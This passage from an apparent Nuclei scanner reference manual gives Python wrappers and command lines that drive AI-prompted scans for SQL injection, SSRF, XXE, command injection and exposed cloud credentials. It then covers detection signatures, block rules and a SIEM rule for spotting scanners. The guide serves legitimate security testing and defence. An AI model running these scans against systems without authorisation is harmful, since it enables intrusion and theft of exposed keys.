                    "Use time delay techniques to detect time-based SQLi in all request parameters with response time analysis"
                ],
                'ssrf': [
                    "Perform fuzzing on all HTTP parameters and methods using DSL, focusing on detecting SSRF vulnerabilities with pre-condition checks like internal IP ranges, URL redirects, and response behaviors",
                    "Detect SSRF in common URL-related parameters like 'url', 'link', 'redirect', 'next', 'feed', and 'callback' by injecting payloads targeting internal services and metadata endpoints",
                    "Identify SSRF in API endpoints that fetch external resources, including indirect references such as file uploads, image fetchers, and URL previews"
                ]
            },
            'api': {
                'injection': [
                    "Probe JSON-based API endpoints for injectable fields susceptible to SQL injection with API-specific payload formatting",
                    "Inject XSS payloads into JSON fields of API requests and responses to find injection points vulnerable to script execution",
                    "Test GraphQL endpoints for injection vulnerabilities through query parameter manipulation"
                ],
                'auth': [
                    "Check for APIs allowing unauthenticated access to admin routes with permission bypass testing",
                    "Identify JWT token manipulation vulnerabilities in API authentication flows",
                    "Test for API key exposure and authentication bypass scenarios"
                ]
            },
            'cloud': {
                'misconfig': [
                    "Identify exposed S3 buckets, GCP buckets, and Azure blobs with insecure permissions (public read/write or misconfigured ACLs)",
                    "Extract AWS access keys or secrets found in HTTP responses with precision filters",
                    "Detect Google Cloud credentials exposed in HTTP responses and filter false positives using key structure"
                ],
                'container': [
                    "Scan for open Docker Engine API endpoints that permit remote control or container enumeration",
                    "Identify unauthenticated Kubernetes API servers accessible over the internet",
                    "Locate publicly accessible Kubernetes Dashboard interfaces with weak or missing authentication"
                ]
            }
        }
        
        return prompt_templates.get(target_type, {}).get(vulnerability_class, [])
    
    def execute_ai_scan(self, targets: List[str], prompt: str, output_format: str = 'json') -> Dict:
        """Execute AI-powered nuclei scan with custom prompts"""
        cmd = [
            'nuclei',
            '-list', 'targets.txt',
            '-ai', prompt,
            '-json' if output_format == 'json' else '-jsonl',
            '-silent'
        ]
        
        # Write targets to file
        with open('targets.txt', 'w') as f:
            for target in targets:
                f.write(f"{target}\n")
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            if result.stdout:
                if output_format == 'json':
                    return {'results': [json.loads(line) for line in result.stdout.strip().split('\n') if line]}
                else:
                    return {'raw_output': result.stdout}
            return {'results': []}
        except subprocess.TimeoutExpired:
            return {'error': 'Scan timeout exceeded'}
        except Exception as e:
            return {'error': str(e)}
    
    def intelligent_security_assessment(self, targets: List[str], assessment_type: str = 'comprehensive') -> Dict:
        """Perform intelligent security assessment using AI-driven prompts"""
        results = {}
        
        assessment_workflows = {
            'comprehensive': [
                ('reconnaissance', 'Extract page title, detect technologies and versions'),
                ('xss_detection', 'Fuzz all parameters and HTTP methods using DSL to detect XSS vulnerabilities, including reflected, stored, and DOM-based variants'),
                ('sqli_detection', 'Perform fuzzing on all parameters and HTTP methods using DSL, focusing on detecting SQL Injection vulnerabilities with pre-conditions'),
                ('ssrf_detection', 'Perform fuzzing on all HTTP parameters and methods using DSL, focusing on detecting SSRF vulnerabilities with pre-condition checks'),
                ('config_exposure', 'Find exposed configuration files containing sensitive information such as credentials, API keys, database passwords'),
                ('admin_panels', 'Identify exposed admin panels of popular CMS (WordPress, Joomla, Magento, OpenCart, etc.)')
            ],
            'api_focused': [
                ('api_discovery', 'Find exposed Swagger, Redocly, GraphiQL, and API Blueprint documentation'),
                ('api_injection', 'Probe JSON-based API endpoints for injectable fields susceptible to SQL injection'),
                ('api_auth', 'Check for APIs allowing unauthenticated access to admin routes'),
                ('api_exposure', 'Identify commonly used API endpoints that expose sensitive user data')
            ],
            'cloud_security': [
                ('cloud_storage', 'Identify exposed S3 buckets, GCP buckets, and Azure blobs with insecure permissions'),
                ('cloud_credentials', 'Extract AWS access keys or secrets found in HTTP responses with precision filters'),
                ('container_exposure', 'Scan for open Docker Engine API endpoints that permit remote control'),
                ('k8s_exposure', 'Identify unauthenticated Kubernetes API servers accessible over the internet')
            ]
        }
        
        workflow = assessment_workflows.get(assessment_type, assessment_workflows['comprehensive'])
        
        for test_name, prompt in workflow:
            print(f"[+] Executing {test_name}...")
            result = self.execute_ai_scan(targets, prompt)
            results[test_name] = result
            time.sleep(2)  # Rate limiting
        
        return results
    
    def generate_ai_report(self, results: Dict, target: str) -> str:
        """Generate comprehensive AI-driven security assessment report"""
        report = f"""
# AI-Powered Security Assessment Report

## Target: {target}
## Scan Date: {time.strftime('%Y-%m-%d %H:%M:%S')}

## Executive Summary
"""
        
        total_findings = 0
        critical_findings = 0
        
        for test_type, test_results in results.items():
            if 'results' in test_results:
                findings_count = len(test_results['results'])
                total_findings += findings_count
                
                critical_count = sum(1 for finding in test_results['results'] 
                                   if finding.get('info', {}).get('severity') == 'critical')
                critical_findings += critical_count
                
                report += f"\n### {test_type.replace('_', ' ').title()}\n"
                report += f"- Findings: {findings_count}\n"
                report += f"- Critical: {critical_count}\n"
        
        report += f"\n## Overall Statistics\n"
        report += f"- Total Findings: {total_findings}\n"
        report += f"- Critical Issues: {critical_findings}\n"
        
        return report

# Usage Example
if __name__ == "__main__":
    # Initialize AI tester with API key
    ai_tester = NucleiAITester("your_pdcp_api_key")
    
    # Define targets for testing
    targets = ["https://example.com", "https://api.example.com"]
    
    # Perform comprehensive AI-driven assessment
    results = ai_tester.intelligent_security_assessment(targets, 'comprehensive')
    
    # Generate and save report
    report = ai_tester.generate_ai_report(results, "example.com")
    with open('ai_security_report.md', 'w') as f:
        f.write(report)
    
    print("AI-powered security assessment completed!")
```

### 19.8 AI Template Validation and Quality Assurance

```bash
# Validate AI-generated templates before deployment
nuclei -t ai-generated-template.yaml -validate

# Test AI templates against known vulnerable targets
nuclei -u http://vulnerable-target.com -t ai-generated-template.yaml -debug

# Template optimization using AI feedback
nuclei -t ai-template.yaml -u target.com -debug-req -debug-resp

# Bulk validation of AI-generated templates
find ai-templates/ -name "*.yaml" -exec nuclei -t {} -validate \;

# Community contribution workflow for AI templates
git clone https://github.com/projectdiscovery/nuclei-templates-ai
cd nuclei-templates-ai
# Review AI-generated template
# Test against vulnerable environment
# Submit PR with validation results
```

### 19.9 Advanced AI Security Testing Scenarios

```bash
# Cache poisoning detection with AI
nuclei -list targets.txt -ai "Test for web cache poisoning via manipulation of 'Host', 'X-Forwarded-Host', and 'X-Forwarded-For' headers, using multi-step validation"

# Host header injection testing
nuclei -list targets.txt -ai "Detect Host Header Injection with password reset bypass and SSRF vector analysis"

# XXE vulnerability detection
nuclei -list katana.jsonl -im jsonl -ai "Fuzz all XML-based input fields using DSL to identify XXE injection points, with pre-conditions for triggering external entity processing"

# Command injection detection
nuclei -list katana.jsonl -im jsonl -ai "Perform fuzzing on all parameters and HTTP methods using DSL, focusing on detecting Remote Code Execution (Command Injection) vulnerabilities"

# Advanced CORS misconfiguration
nuclei -list targets.txt -ai "Find misconfigured CORS policies allowing wildcard origins with credential access implications"

# Business logic flaw detection
nuclei -list targets.txt -ai "Identify business logic flaws in payment processing, user registration, and privilege escalation scenarios"
```

### 19.10 Integration with AI Security Platforms

```python
# Integration with multiple AI security platforms
class MultiAISecurityPlatform:
    def __init__(self):
        self.platforms = {
            'nuclei_ai': self.nuclei_ai_scan,
            'openai_security': self.openai_security_analysis,
            'custom_ml': self.custom_ml_analysis
        }
    
    def nuclei_ai_scan(self, targets: List[str], prompt: str) -> Dict:
        """Execute Nuclei AI-powered scan"""
        cmd = ['nuclei', '-list', 'targets.txt', '-ai', prompt, '-json']
        # Implementation details...
        return {'platform': 'nuclei_ai', 'results': []}
    
    def openai_security_analysis(self, targets: List[str], context: str) -> Dict:
        """Integrate with OpenAI for security analysis"""
        # Custom implementation using OpenAI API
        return {'platform': 'openai', 'analysis': []}
    
    def custom_ml_analysis(self, targets: List[str], model_type: str) -> Dict:
        """Custom ML-based security analysis"""
        # Implementation for custom ML models
        return {'platform': 'custom_ml', 'predictions': []}
    
    def comprehensive_ai_assessment(self, targets: List[str]) -> Dict:
        """Run assessment across multiple AI platforms"""
        results = {}
        
        for platform_name, platform_func in self.platforms.items():
            try:
                result = platform_func(targets, "comprehensive security assessment")
                results[platform_name] = result
            except Exception as e:
                results[platform_name] = {'error': str(e)}
        
        return results

# Usage
multi_ai = MultiAISecurityPlatform()
comprehensive_results = multi_ai.comprehensive_ai_assessment(["https://example.com"])
```

This comprehensive AI capabilities section demonstrates how Nuclei's artificial intelligence features can revolutionize security testing through automated template generation, intelligent vulnerability detection, and context-aware security assessment workflows.

## 20. Monitoring and Defensive Considerations

Defensive strategies should be implemented to detect unauthorized scanning activities while maintaining operational security for legitimate testing.

### 20.1 Detection Signatures

Security teams should monitor for the following Nuclei-related indicators:

**Network Pattern Analysis:**
- High-frequency HTTP requests to multiple endpoints
- Requests with uncommon User-Agent strings containing "Nuclei"
- Sequential testing of common vulnerability patterns
- Rapid enumeration of directory structures and files

**Request Behavior Analysis:**
- HTTP requests with specific header patterns used by Nuclei
- POST requests with common SQL injection payloads
- Requests to security-sensitive endpoints (admin, config, etc.)
- Error response pattern analysis for vulnerability probing

**Traffic Volume Indicators:**
- Unusual request volume from single source IPs
- Consistent timing patterns in request intervals
- Multiple requests to non-existent resources (404 patterns)
- Cross-site request patterns indicating lateral scanning

### 20.2 Defensive Countermeasures

```bash
# Rate limiting implementation
iptables -A INPUT -p tcp --dport 80 -m limit --limit 25/minute --limit-burst 100 -j ACCEPT

# Request pattern blocking
# Block common Nuclei User-Agent
nginx: if ($http_user_agent ~* "nuclei") { return 403; }

# IP reputation monitoring
fail2ban-regex /var/log/nginx/access.log "nuclei|security scanner|vulnerability"

# Honeypot deployment for scanner detection
# Deploy fake admin panels and vulnerable endpoints
location /admin {
    access_log /var/log/honeypot.log;
    return 200 "Admin Login";
}
```

### 20.3 Response and Mitigation Strategies

```yaml
# SIEM Detection Rule Example (Splunk)
search: |
  index=web_access
  | eval is_nuclei=if(match(user_agent, "(?i)nuclei"), 1, 0)
  | eval is_scan_pattern=if(match(uri_path, "(?i)(admin|config|backup|test)"), 1, 0)
  | eval high_frequency=if(count > 100, 1, 0)
  | where is_nuclei=1 OR (is_scan_pattern=1 AND high_frequency=1)
  | stats count by src_ip, user_agent
  | where count > 50

# Automated Response Script
#!/bin/bash
SCAN_THRESHOLD=100
LOG_FILE="/var/log/access.log"
BLOCKED_IPS="/tmp/blocked_ips.txt"

while IFS= read -r line; do
    IP=$(echo "$line" | awk '{print $1}')
    REQUESTS=$(grep "$IP" "$LOG_FILE" | wc -l)
    
    if [ "$REQUESTS" -gt "$SCAN_THRESHOLD" ]; then
        echo "$IP" >> "$BLOCKED_IPS"
        iptables -A INPUT -s "$IP" -j DROP
        logger "Blocked IP $IP for excessive scanning ($REQUESTS requests)"
    fi
done < <(tail -f "$LOG_FILE")
```


## Conclusion

This comprehensive Nuclei reference manual provides security practitioners with the knowledge and tools necessary to implement effective vulnerability scanning programs. The techniques and methodologies described represent current best practices for automated security assessment, enabling organizations to proactively identify and remediate security vulnerabilities.

The evolution of the threat landscape requires continuous adaptation of scanning methodologies and template development. Future research should focus on machine learning-enhanced template generation, cloud-native security assessment capabilities, and integration with emerging DevSecOps workflows.

Security practitioners must balance the offensive capabilities of Nuclei with responsible disclosure practices, comprehensive documentation, and adherence to legal and ethical guidelines to ensure the advancement of cybersecurity while maintaining trust and accountability.

## References

- [Nuclei Official Documentation](https://docs.nuclei.sh/)
- [ProjectDiscovery Nuclei GitHub Repository](https://github.com/projectdiscovery/nuclei)
- [Nuclei Templates Repository](https://github.com/projectdiscovery/nuclei-templates)
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [NIST Special Publication 800-115: Technical Guide to Information Security Testing](https://nvlpubs.nist.gov/nistpubs/Legacy/SP/nistspecialpublication800-115.pdf)
- [CVE Details Database](https://www.cvedetails.com/)
- [MITRE ATT&CK Framework](https://attack.mitre.org/)
- [ProjectDiscovery Blog: Ultimate Nuclei Guide](https://blog.projectdiscovery.io/ultimate-nuclei-guide/)
- [Nuclei Template Creation Guide](https://nuclei.projectdiscovery.io/templating-guide/)
- [YAML Specification](https://yaml.org/spec/1.2/spec.html)
- [HTTP/1.1 Specification (RFC 7230)](https://tools.ietf.org/html/rfc7230)
- [DNS Protocol Specification (RFC 1035)](https://tools.ietf.org/html/rfc1035)
- [TLS 1.3 Specification (RFC 8446)](https://tools.ietf.org/html/rfc8446)